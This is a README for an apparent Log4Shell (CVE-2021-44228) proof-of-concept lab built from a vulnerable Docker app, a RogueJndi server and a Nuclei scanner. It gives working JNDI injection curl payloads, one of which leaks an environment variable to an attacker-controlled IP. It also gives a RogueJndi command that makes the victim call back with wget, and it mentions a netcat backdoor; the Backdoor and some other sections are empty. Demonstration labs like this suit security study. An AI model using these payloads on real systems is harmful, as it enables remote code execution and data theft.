# Log4Shell POC

Demonstrates the Log4Shell (CVE-2021-44228) vulnerability.
You can run a simple attack to demonstrate JNDI out of band (OOB) attack. But also more sophisticated attacks with your own code e.g. to open a backdoor using netcat (nc).

This repo consists for three parts:

1. Vulnerable App (Vulnerable-App)
2. JNDI Server (RogueJndi)
3. Vulnerability Scanner (Nuclei)

All three repos have their origin in separate upstream projects (see following sections for more details)

# Requirements

1. Java
2. Maven

## Install maven

### MacOS

```bash
brew install maven
```

# Setup

## Run the vulnerable app

```bash
docker build -f log4shell-vulnerable-app/Dockerfile -t vulnerable-app log4shell-vulnerable-app/.
docker run -p 8080:8080 --name vulnerable-app --rm vulnerable-app
```

## Test the app

Just run the following command. It will return "Hello, world!". Check the app's command line for error message. It will try to lookup the jndi server running on localhost port 1389.

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://localhost:1389/a}'
```

```bash
2022-02-06 11:13:28,611 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://localhost:1389/a]. javax.naming.CommunicationException: localhost:1389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
        at com.sun.jndi.ldap.Connection.<init>(Connection.java:238)
        at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
```

# Attack

## Simple attack

The JNDI Server (RogueJNDI) will run a JNDI server (port 1389) and a http server (8000). The JNDI Server will serve vulnerable code to be executed on the vulnerable-app. The http server is a backcall server for receiving calls sent from the vulnerable app.

## Run the JNDI server

get your local ip address (MacOS)

```bash
# for ethernet
ipconfig getifaddr en0
# for wireless
ipconfig getifaddr en1

```

```bash
cd rogue-jndi
mvn compile package
java -jar target/RogueJndi-1.1.jar -c "wget http://your-private-ip:8000 -H 'leak:$(JAVA_VERSION)'"
```

## Issue simple attack

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/a/${env:JAVA_HOME}}'
```

## Backdoor

# Details

# References

## Vulnerable app

https://github.com/christophetd/log4shell-vulnerable-app

## RogueJNDI

https://github.com/veracode-research/rogue-jndi.git

## Nuclei
